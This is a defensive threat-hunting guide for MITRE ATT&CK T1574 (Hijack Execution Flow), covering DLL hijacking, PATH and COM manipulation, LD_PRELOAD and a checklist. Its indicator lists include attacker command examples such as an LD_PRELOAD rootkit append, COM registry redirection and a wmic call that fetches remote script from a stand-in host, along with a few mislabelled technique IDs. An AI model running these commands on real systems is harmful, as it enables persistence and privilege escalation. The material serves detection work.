# Hijack Execution Flow: [T1574](https://attack.mitre.org/techniques/T1574/)

## Detection Explanation

Hijack Execution Flow occurs when adversaries exploit the mechanisms operating systems use to locate and load code, libraries, or executables to execute their malicious payloads. By manipulating search paths, order of execution, or trusted application loading behaviors, attackers can cause legitimate programs to inadvertently load and execute attacker-controlled code. This technique leverages the inherent trust placed in application loading mechanisms, allowing malicious code to execute with the privileges and context of legitimate applications.

Attackers use execution flow hijacking for multiple objectives including persistence, privilege escalation, and defense evasion. Common sub-techniques include DLL Search Order Hijacking (T1574.001) where attackers place malicious DLLs in locations searched before legitimate library paths, DLL Side-Loading (T1574.002) exploiting applications that load DLLs from their current directory, Dylib Hijacking (T1574.004) on macOS systems, Executable Installer File Permissions Weakness (T1574.005), Path Interception (T1574.007) through unquoted service paths or PATH environment manipulation, and Services File Permissions Weakness (T1574.010). This technique is particularly effective because the malicious code executes within the security context of trusted, signed applications, often bypassing application whitelisting and other security controls.

The technique is frequently observed during initial access persistence establishment and privilege escalation phases. Attackers exploit applications that improperly validate library loading, use relative paths without verification, or have weak file permissions on executables and configuration files. Notable examples include abusing Windows DLL search order to load malicious libraries before legitimate ones, exploiting applications that load DLLs from their working directory, manipulating the PATH environment variable to redirect execution, and exploiting unquoted service paths in Windows services. Tools and malware families commonly leverage execution flow hijacking to maintain persistence while evading detection by security products.

Detection requires monitoring for DLL loads from unusual locations, tracking changes to environment variables and search paths, identifying file writes to application directories by non-installer processes, and detecting execution of legitimate binaries loading unexpected libraries. Organizations must focus on unauthorized modifications to trusted application directories, anomalous library loading patterns, and the creation of files with names matching legitimate system libraries in user-writable locations.

---

## Key Detection Indicators & Areas to Investigate

### Summary of Indicators

1. DLL Search Order Hijacking - suspicious DLL loads from user-writable locations (T1574.001)
2. DLL Side-Loading - legitimate signed applications loading malicious DLLs (T1574.002)
3. PATH environment variable manipulation (T1574.007)
4. Unquoted service paths exploitation (T1574.009)
5. Weak file permissions on executables and services (T1574.010)
6. Phantom DLL hijacking - loading non-existent DLLs
7. COM hijacking through registry modifications (T1574.001)
8. Application shimming and DLL redirection
9. LD_PRELOAD and DYLD_INSERT_LIBRARIES on Linux/macOS (T1574.006)
10. Execution proxying through trusted binaries loading malicious payloads

---

### 1. DLL Search Order Hijacking - Suspicious DLL Loads from User-Writable Locations (T1574.001)

**Sysmon:**

- Event ID 7 (Image Loaded) - DLL loads with suspicious `ImageLoaded` paths
    - Monitor for DLLs loaded from: `%TEMP%`, `%APPDATA%`, `%LOCALAPPDATA%`, `C:\Users\`, `C:\ProgramData\`
    - Check `Signed` and `SignatureStatus` fields for unsigned or invalid signatures
- Event ID 11 (File Create) - DLL files created in application directories or system paths
- Event ID 1 (Process Creation) - Processes loading from unexpected working directories

**Windows Event Logs:**

- Event ID 4688 (Process Creation) - Check working directory and image path fields
- Event ID 4663 (File Access) - Write access to Program Files or Windows\System32 directories

**EDR/File Monitoring:**

- DLL writes to directories in the Windows DLL search order
- Library loads from current working directory before System32
- DLL placement in application installation directories

**Focus on:**

- System processes loading DLLs from non-system locations
- Recently created DLLs (creation time within last 7 days) loaded by trusted applications
- DLLs with names matching legitimate Windows libraries but from wrong paths
- Applications loading multiple DLLs from temporary directories

**Suspicious indicators:**

- `explorer.exe` loading DLLs from `C:\Users\Public\` or `%TEMP%`
- Legitimate applications loading: `version.dll`, `wininet.dll`, `kernel32.dll` from application directory
- DLL names: `wlbsctrl.dll`, `TSMSISrv.dll`, `WLBSCTRL.dll` (commonly hijacked)
- Office applications loading DLLs from `%APPDATA%\Microsoft\` or user profile directories
- Signed executables (Adobe, Microsoft) loading unsigned DLLs from current directory
- System utilities loading DLLs from writable paths: `C:\Windows\Tasks\`, `C:\Windows\Temp\`
- Browser processes loading DLLs from Downloads folder
- PowerShell or cmd.exe loading non-standard DLLs from script execution paths
- DLL hijacking through Windows Accessibility features loading from user directories

---

### 2. DLL Side-Loading - Legitimate Signed Applications Loading Malicious DLLs (T1574.002)

**Sysmon:**

- Event ID 7 (Image Loaded) - Correlation between signed `Image` and unsigned `ImageLoaded`
    - Trusted executables (Microsoft, Adobe, Symantec signatures) loading unsigned DLLs
- Event ID 1 (Process Creation) - Execution of legitimate binaries from unusual locations
- Event ID 11 (File Create) - DLL drops alongside legitimate executable copies

**Windows Event Logs:**

- Event ID 8002 (Application Experience - Compatibility Installer) - Application compatibility shim usage
- Event ID 4688 (Process Creation) - Legitimate application execution from non-standard paths

**Application Logs:**

- Application errors indicating failed DLL loads or unexpected library versions
- Code Integrity logs (Event ID 3033/3063) showing unsigned module loads

**Look for:**

- Copies of legitimate executables in user-writable directories
- Legitimate applications running from `%TEMP%`, `%APPDATA%`, `C:\ProgramData\`
- Trusted binaries loading DLLs with suspicious export functions
- DLL side-loading via applications with known vulnerabilities

**Suspicious indicators:**

- **Common side-loading targets:**
    - `GUP.exe` (Notepad++ updater) loading `libcurl.dll`
    - `OneDriveStandaloneUpdater.exe` loading `version.dll`
    - `Werfault.exe` (Windows Error Reporting) loading `faultrep.dll`
    - `chrome_frame_helper.exe` loading `goopdate.dll`
    - Symantec/McAfee executables loading hijacked DLLs
- Legitimate executables copied to: `C:\ProgramData\`, `C:\Users\Public\`, `%APPDATA%`
- Executables with valid signatures loading DLLs with mismatched or no signatures
- Application directories containing both legitimate EXE and malicious DLL pairs
- Remote administration tools (RDP, VNC) loading unexpected libraries
- Scheduled tasks executing legitimate binaries from temporary locations
- Persistence via side-loaded DLLs: Registry Run keys pointing to copied legitimate executables
- Foreign language applications or utilities rarely used in the environment suddenly executed

---

### 3. PATH Environment Variable Manipulation (T1574.007)

**Registry Monitoring:**

- `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path` - System PATH
- `HKCU\Environment\Path` - User PATH

**Sysmon:**

- Event ID 13 (Registry Value Set) - Modifications to PATH environment variables
- Event ID 1 (Process Creation) - Check `CommandLine` for PATH modifications via `setx` or `reg add`
- Event ID 11 (File Create) - Executables created in directories added to PATH

**Windows Event Logs:**

- Event ID 4657 (Registry Value Modified) - PATH registry changes
- Event ID 4688 (Process Creation) - Commands modifying environment variables

**PowerShell Logs:**

- Event ID 4104 (Script Block Logging) - Scripts modifying `$env:PATH` or using `[Environment]::SetEnvironmentVariable`

**Focus on:**

- User-writable directories prepended to PATH (searched before system directories)
- Addition of temporary directories, network shares, or unusual paths
- PATH modifications by non-administrative users
- PATH changes correlating with malicious executable placement

**Suspicious indicators:**

- Commands: `setx PATH "%TEMP%;%PATH%"`, `reg add HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment /v Path`
- User directories added to beginning of system PATH: `C:\Users\username\AppData\Local\;`
- Network paths or UNC paths in PATH: `\\attacker-server\share;%PATH%`
- Addition of `C:\ProgramData\`, `C:\Users\Public\`, or hidden directories
- PATH modifications followed by execution of common utility names: `cmd.exe`, `powershell.exe`, `net.exe`
- Executables with system utility names placed in PATH directories: `%TEMP%\cmd.exe`, `%APPDATA%\powershell.exe`
- PowerShell: `[Environment]::SetEnvironmentVariable("PATH", "C:\Evil;$env:PATH", "Machine")`
- Batch scripts or installers modifying PATH without legitimate software installation context
- PATH entries pointing to temporary directories that persist after reboot

---

### 4. Unquoted Service Paths Exploitation (T1574.009)

**Registry Monitoring:**

- `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath` - Service executable paths

**Sysmon:**

- Event ID 13 (Registry Value Set) - Service ImagePath modifications
- Event ID 11 (File Create) - Executable creation in paths matching unquoted service path fragments
- Event ID 1 (Process Creation) - Execution from intermediate service path locations

**Windows Event Logs:**

- Event ID 7045 (Service Installed) - New service with unquoted path
- Event ID 7040 (Service Start Type Changed) - Service configuration modifications
- Event ID 4688 (Process Creation) - Parent process `services.exe` spawning from unexpected paths
- Event ID 4697 (Service Installed) - Service installation with unquoted ImagePath

**Service Enumeration:**

- PowerShell: `Get-WmiObject Win32_Service | Where {$_.PathName -notmatch '^".*"' -and $_.PathName -match ' '}`
- Command: `wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """`

**Look for:**

- Service paths containing spaces without quotes
- Executables created at intermediate path positions
- Service paths under `C:\Program Files\` without quotes
- Service modification or creation by non-SYSTEM accounts

**Suspicious indicators:**

- **Vulnerable service path examples:**
    - `C:\Program Files\Vendor Name\Application\service.exe` → Attacker creates `C:\Program.exe`
    - `C:\Program Files (x86)\Common Files\Service\app.exe` → Attacker creates `C:\Program.exe` or `C:\Program Files (x86)\Common.exe`
- File creation: `C:\Program.exe`, `C:\Program Files\Vendor.exe`, `C:\Program Files (x86)\Common.exe`
- Service configuration changes to introduce spaces in paths
- Executables with generic names (`Program.exe`, `Common.exe`, `Vendor.exe`) at root or Program Files level
- Services with ImagePath modifications removing quotes
- Event ID 7045 showing service installation with unquoted paths by non-admin users
- Service start followed by execution from unintended path location
- Privilege escalation: Service running as SYSTEM executing attacker-placed executable

---

### 5. Weak File Permissions on Executables and Services (T1574.010)

**File System Monitoring:**

- ACL changes on executable files and service binaries
- Write access to Program Files, Windows\System32, or service executable paths

**Sysmon:**

- Event ID 11 (File Create) - Overwrites or modifications to service executables
- Event ID 2 (File Creation Time Changed) - Timestomping on legitimate executables
- Event ID 1 (Process Creation) - Modified service executables launching

**Windows Event Logs:**

- Event ID 4663 (File Access) - Write/Delete access to system executables
- Event ID 4670 (Permissions Changed) - ACL modifications on executable files
- Event ID 4688 (Process Creation) - Execution of recently modified system binaries

**PowerShell/Command Line:**

- `icacls` or `Get-Acl` showing weak permissions: Everyone (F), Users (W), Authenticated Users (M)
- Permission enumeration: `accesschk.exe -wvu "C:\Program Files"`, `Get-Acl | Where {$_.Access -match "Users.*Allow.*Write"}`

**Focus on:**

- Executables in system directories with write permissions for standard users
- Service binaries with weak ACLs allowing modification
- Installer directories with overly permissive permissions persisting after installation
- Configuration files controlling executable behavior with write access

**Suspicious indicators:**

- Service executables with ACLs allowing: `BUILTIN\Users (W)`, `Everyone (F)`, `Authenticated Users (M)`
- Executables in `C:\Windows\System32\` or `C:\Program Files\` modified by non-SYSTEM accounts
- File modification timestamps on critical system binaries changed recently
- Executables showing write access in permission audits: `icacls "C:\Program Files\App\service.exe" | findstr Users`
- Service executable modifications correlating with service restarts
- Overwritten legitimate executables retaining original file names but different hashes
- Changes to binaries in Windows\System32: `svchost.exe`, `lsass.exe`, `services.exe` (extremely rare)
- Application executables replaced with malicious versions maintaining original file metadata
- Executable signing status changing from signed to unsigned
- Modified executables with creation dates predating actual file modification times (timestomping)

---

### 6. Phantom DLL Hijacking - Loading Non-Existent DLLs

**Sysmon:**

- Event ID 7 (Image Loaded) - Failed DLL loads (requires verbose logging)
- Event ID 11 (File Create) - DLL creation in paths where applications previously failed to load libraries

**EDR/Process Monitoring:**

- API monitoring: `LoadLibrary()`, `LoadLibraryEx()` calls returning errors
- DLL load failures followed by successful loads from unexpected locations

**Application Logs:**

- Application errors showing DLL load failures (Event ID 1000, 1001)
- Side-by-Side Configuration errors (Event ID 33, 34, 35)

**Tools:**

- Process Monitor: Filter for `NAME NOT FOUND` or `PATH NOT FOUND` on DLL operations
- Dependency Walker or similar tools identifying missing DLLs

**Look for:**

- Applications attempting to load DLLs that don't exist in standard Windows installations
- Previously non-existent DLLs suddenly appearing in application directories
- DLL names in load attempts that match common Windows libraries but from wrong paths
- Applications loading optional/non-critical DLLs from hijackable locations

**Suspicious indicators:**

- Common phantom DLLs: `CRYPTSP.dll`, `CRYPTBASE.dll`, `WINMM.dll`, `WTSAPI32.dll`, `SAMLIB.dll`
- Application attempting to load DLL → failure → DLL created in application directory → successful load
- Legitimate applications loading newly created DLLs matching previously failed load attempts
- DLL files created in application installation directories after application execution begins
- Applications in Program Files loading optional DLLs from current working directory
- Services attempting to load non-existent DLLs from Windows\System32, then loading from elsewhere
- Browser extensions or plugins loading phantom DLLs from user profile directories
- Microsoft Office applications loading previously non-existent DLLs from Office installation path
- Executables showing dependency on DLLs not typically required by that application type

---

### 7. COM Hijacking Through Registry Modifications (T1574.001)

**Registry Monitoring:**

- `HKCU\Software\Classes\CLSID\{GUID}\InprocServer32` - User-level COM object hijacking
- `HKCU\Software\Classes\CLSID\{GUID}\LocalServer32` - Local COM server hijacking
- `HKLM\Software\Classes\CLSID\{GUID}\InprocServer32` - System-level COM hijacking
- `HKCU\Software\Classes\*\ShellEx\*` - Shell extension handler hijacking

**Sysmon:**

- Event ID 13 (Registry Value Set) - CLSID or InprocServer32 value modifications
- Event ID 12 (Registry Object Created) - New CLSID entries created
- Event ID 7 (Image Loaded) - DLL loads from COM object instantiation

**Windows Event Logs:**

- Event ID 4657 (Registry Value Modified) - CLSID registry changes
- Event ID 4688 (Process Creation) - COM surrogate processes (`dllhost.exe`) executing unusual DLLs

**PowerShell Logs:**

- Event ID 4104 (Script Block Logging) - Scripts enumerating or modifying CLSID entries

**Focus on:**

- User-level CLSID entries overriding system-level COM objects
- InprocServer32 or LocalServer32 paths pointing to unusual locations
- COM objects pointing to executables/DLLs in temporary or user-writable directories
- Modifications to commonly used COM objects (Microsoft Office, Windows Explorer extensions)

**Suspicious indicators:**

- CLSID InprocServer32 paths pointing to: `%TEMP%`, `%APPDATA%`, `C:\ProgramData\`, user profile directories
- COM object modifications for persistence: `{BCDE0395-E52F-467C-8E3D-C4579291692E}` (Task Scheduler), `{20D04FE0-3AEA-1069-A2D8-08002B30309D}` (My Computer)
- New user-level CLSID entries shadowing legitimate system CLSIDs
- COM hijacking of Office add-ins or shell extensions
- Registry changes: `reg add HKCU\Software\Classes\CLSID\{...}\InprocServer32 /ve /d "C:\Evil\malicious.dll"`
- PowerShell: `New-Item -Path "HKCU:\Software\Classes\CLSID\{GUID}" -Force`
- `dllhost.exe` or `rundll32.exe` loading DLLs from non-standard locations via COM
- COM objects with TreatAs or ProgID keys redirecting to malicious implementations
- Shell extension handlers pointing to attacker-controlled DLLs
- COM object modifications correlating with persistence establishment or privilege escalation
- Explorer context menu handlers loading malicious DLLs

---

### 8. Application Shimming and DLL Redirection

**Registry Monitoring:**

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom`
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB`

**Sysmon:**

- Event ID 13 (Registry Value Set) - AppCompat registry modifications
- Event ID 11 (File Create) - SDB file creation in `C:\Windows\AppPatch\Custom\`
- Event ID 1 (Process Creation) - `sdbinst.exe` execution installing shim databases

**Windows Event Logs:**

- Event ID 8002 (Application Experience) - Shim database installation
- Event ID 8003 (Application Experience) - Application shimmed at runtime
- Event ID 4688 (Process Creation) - `sdbinst.exe` command line showing custom SDB installation

**File System:**

- Files in `C:\Windows\AppPatch\Custom\` - Custom shim databases
- Files in `%TEMP%` or user directories with `.sdb` extension

**Focus on:**

- Installation of custom shim databases by non-administrative users
- Shim databases redirecting DLL loads or hooking API calls
- Application compatibility fixes applied to unexpected executables
- Shim installations without corresponding legitimate software deployment

**Suspicious indicators:**

- Commands: `sdbinst.exe -q C:\Users\Public\malicious.sdb`, `sdbinst.exe /install custom_shim.sdb`
- Shim databases applying redirects or hooks to: `cmd.exe`, `powershell.exe`, system utilities
- SDB files with suspicious names or in unusual locations being installed
- Application compatibility fixes applied to LOLBins (Living Off the Land Binaries)
- Shim database entries modifying LoadLibrary behavior or DLL search paths
- Registry entries in InstalledSDB pointing to user-writable directories
- Event ID 8002/8003 showing shimming of critical system binaries
- Shim databases containing `RedirectEXE`, `InjectDll`, or `RedirectDLL` fixes
- DLL redirection manifests (`.manifest`, `.local` files) placed alongside executables
- WinSxS side-by-side assembly hijacking through policy modifications

---

### 9. LD_PRELOAD and DYLD_INSERT_LIBRARIES on Linux/macOS (T1574.006)

**Linux - Environment Variables:**

- `/etc/environment` - System-wide environment variables
- `/etc/profile`, `/etc/bash.bashrc` - Shell initialization scripts
- `~/.bashrc`, `~/.bash_profile`, `~/.profile` - User shell configurations

**Linux - Audit Logs (auditd):**

- Monitor file writes to: `/etc/ld.so.preload`, `/etc/ld.so.conf.d/`
- Track environment variable modifications: `LD_PRELOAD`, `LD_LIBRARY_PATH`
- Process execution with modified library paths

**macOS - LaunchAgents/LaunchDaemons:**

- Environment variable injection in `~/Library/LaunchAgents/`, `/Library/LaunchAgents/`
- `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH` in plist files

**Command Execution:**

- Bash history showing: `export LD_PRELOAD=/path/to/malicious.so`
- Commands: `LD_PRELOAD=/tmp/evil.so /usr/bin/program`

**Look for:**

- Modifications to `/etc/ld.so.preload` outside package management
- Shared objects (`.so` files) in temporary directories or user-writable locations
- Environment variable modifications in shell startup scripts
- Library preloading of critical system binaries (sudo, ssh, login)

**Suspicious indicators:**

- `/etc/ld.so.preload` containing entries: `/tmp/evil.so`, `/home/user/.hidden/malicious.so`
- Commands: `echo "/tmp/rootkit.so" >> /etc/ld.so.preload`
- Bash history: `export LD_PRELOAD=/dev/shm/inject.so && sudo command`
- Shared objects with suspicious names in: `/tmp/`, `/dev/shm/`, user home directories
- LD_PRELOAD usage targeting: `sshd`, `sudo`, `passwd`, authentication binaries
- macOS: DYLD environment variables in LaunchAgent plist files pointing to unsigned libraries
- Process execution showing library loads from unexpected paths via `lsof` or `pmap`
- Persistence via shell startup scripts: `.bashrc`, `.zshrc` containing LD_PRELOAD exports
- Shared objects without proper ELF headers or suspicious export functions
- Library injection into system processes or daemons during startup

---

### 10. Execution Proxying Through Trusted Binaries Loading Malicious Payloads

**Sysmon:**

- Event ID 1 (Process Creation) - Trusted binaries executed from unusual locations or with suspicious parameters
- Event ID 7 (Image Loaded) - Trusted executables loading unexpected DLLs or plugins
- Event ID 11 (File Create) - Plugin or configuration files created for trusted applications

**Windows Event Logs:**

- Event ID 4688 (Process Creation) - Legitimate signed binaries with unusual command lines
- Event ID 4663 (File Access) - Write access to plugin directories of trusted applications

**Application Logs:**

- Application-specific logs showing plugin loading or extension execution

**Focus on:**

- Signed Microsoft binaries executing attacker payloads (LOLBins with DLL loading)
- Browser processes loading malicious extensions or plugins
- Scripting host processes (wscript.exe, mshta.exe) loading attacker content
- Trusted utilities loading libraries or scripts from unexpected locations

**Suspicious indicators:**

- **Microsoft signed binaries used for execution proxying:**
    - `rundll32.exe` loading DLLs from user-writable locations
    - `regsvr32.exe` registering DLLs from `%TEMP%` or network paths
    - `mshta.exe` executing HTA files with embedded scripts
    - `wmic.exe` loading XSL scripts: `wmic os get /format:"https://attacker.com/evil.xsl"`
    - `mavinject.exe` injecting DLLs: `mavinject.exe PID /INJECTRUNNING C:\path\to\malicious.dll`
    - `SyncAppvPublishingServer.exe` executing PowerShell: `SyncAppvPublishingServer.exe "n;calc"`
- Browser extension loading from: `%APPDATA%\Local\Google\Chrome\User Data\Default\Extensions\`
- Adobe Reader plugins in user directories: `%APPDATA%\Adobe\Acrobat\Plugins\`
- Microsoft Office add-ins loading from unexpected locations
- `odbcconf.exe` loading malicious DLLs: `odbcconf.exe /a {REGSVR C:\malicious.dll}`
- `control.exe` loading CPL files from user directories: `control.exe C:\Users\Public\evil.cpl`
- Execution through DLL exports: `rundll32.exe payload.dll,EntryPoint`
- Plugin directories for media players, PDF readers, or Office applications containing recently created files
- Configuration file manipulation redirecting execution to attacker payloads

---

# Hijack Execution Flow (T1574) Investigation Checklist

## 1. DLL Search Order Hijacking Detection

- [ ]  Review Sysmon Event ID 7 for DLL loads from: `%TEMP%`, `%APPDATA%`, `%LOCALAPPDATA%`, `C:\Users\`, `C:\ProgramData\`
- [ ]  Check for system processes loading DLLs from non-system locations (unsigned or invalid signatures)
- [ ]  Search Sysmon Event ID 11 for DLL creation in application directories or system paths
- [ ]  Identify recently created DLLs (within 7 days) loaded by trusted applications
- [ ]  Look for DLLs with names matching legitimate Windows libraries (version.dll, wininet.dll, kernel32.dll) from non-standard paths

## 2. DLL Side-Loading Analysis

- [ ]  Check Sysmon Event ID 7 for signed executables (Microsoft, Adobe, Symantec) loading unsigned DLLs
- [ ]  Search Event ID 4688/Sysmon Event ID 1 for legitimate applications running from `%TEMP%`, `%APPDATA%`, `C:\ProgramData\`
- [ ]  Identify copies of legitimate executables (GUP.exe, OneDriveStandaloneUpdater.exe, Werfault.exe) in user-writable directories
- [ ]  Review Sysmon Event ID 11 for DLL drops alongside copied legitimate executables
- [ ]  Look for legitimate binaries with valid signatures loading DLLs with mismatched or no signatures

## 3. PATH Environment Variable Manipulation

- [ ]  Check Sysmon Event ID 13 for modifications to: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path`
- [ ]  Review Event ID 4657 for PATH registry value modifications
- [ ]  Search Event ID 4688/PowerShell Event ID 4104 for: setx PATH, reg add commands, [Environment]::SetEnvironmentVariable
- [ ]  Identify user-writable directories prepended to system PATH (searched before system directories)
- [ ]  Look for executables with system utility names in new PATH directories (%TEMP%\cmd.exe, %APPDATA%\powershell.exe)

## 4. Unquoted Service Paths Exploitation

- [ ]  Enumerate services with unquoted paths containing spaces: `Get-WmiObject Win32_Service | Where {$_.PathName -notmatch '^".*"'}`
- [ ]  Check Sysmon Event ID 11 for executables created at: `C:\Program.exe`, `C:\Program Files\Vendor.exe`
- [ ]  Review Event ID 7045/4697 for service installation with unquoted ImagePath
- [ ]  Search Event ID 4688 for services.exe spawning processes from intermediate path locations
- [ ]  Identify Sysmon Event ID 13 modifications removing quotes from service ImagePath registry values

## 5. Weak File Permissions on Executables

- [ ]  Review Event ID 4663 for write/delete access to system executables in: `C:\Windows\System32\`, `C:\Program Files\`
- [ ]  Check Sysmon Event ID 11 for overwrites to service executables or system binaries
- [ ]  Identify Event ID 4670 showing ACL modifications on executable files
- [ ]  Search for executables with weak permissions: Everyone (F), Users (W), Authenticated Users (M)
- [ ]  Look for Sysmon Event ID 2 (file creation time changes) on legitimate executables (timestomping indicators)

## 6. Phantom DLL Hijacking

- [ ]  Check application logs (Event ID 1000/1001) for DLL load failures
- [ ]  Review Sysmon Event ID 11 for DLL creation in paths where applications previously failed to load libraries
- [ ]  Identify common phantom DLLs: CRYPTSP.dll, CRYPTBASE.dll, WINMM.dll, WTSAPI32.dll, SAMLIB.dll
- [ ]  Search for applications loading newly created DLLs matching previously failed load attempts
- [ ]  Look for DLL files created in application directories after application execution begins

## 7. COM Hijacking Detection

- [ ]  Review Sysmon Event ID 13 for modifications to: `HKCU\Software\Classes\CLSID\*\InprocServer32`, `\LocalServer32`
- [ ]  Check Event ID 4657 for CLSID registry value modifications
- [ ]  Search for InprocServer32/LocalServer32 paths pointing to: `%TEMP%`, `%APPDATA%`, `C:\ProgramData\`
- [ ]  Identify new user-level CLSID entries (Sysmon Event ID 12) shadowing system CLSIDs
- [ ]  Look for dllhost.exe or rundll32.exe loading DLLs from non-standard locations via COM instantiation

## 8. Application Shimming & DLL Redirection

- [ ]  Check Event ID 8002/8003 for shim database installation and application shimming events
- [ ]  Review Event ID 4688/Sysmon Event ID 1 for sdbinst.exe execution with custom SDB files
- [ ]  Search Sysmon Event ID 11 for .sdb file creation in: `C:\Windows\AppPatch\Custom\`, user directories
- [ ]  Identify Sysmon Event ID 13 modifications to: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\`
- [ ]  Look for shim databases applying fixes to: cmd.exe, powershell.exe, system utilities, LOLBins

## 9. Library Preloading (Linux/macOS)

- [ ]  Check file modifications to: `/etc/ld.so.preload`, `/etc/ld.so.conf.d/`, shell startup scripts
- [ ]  Review bash history for: export LD_PRELOAD, export DYLD_INSERT_LIBRARIES commands
- [ ]  Search for .so files in temporary directories: `/tmp/`, `/dev/shm/`, user home directories
- [ ]  Identify LD_PRELOAD usage targeting critical binaries: sudo, sshd,

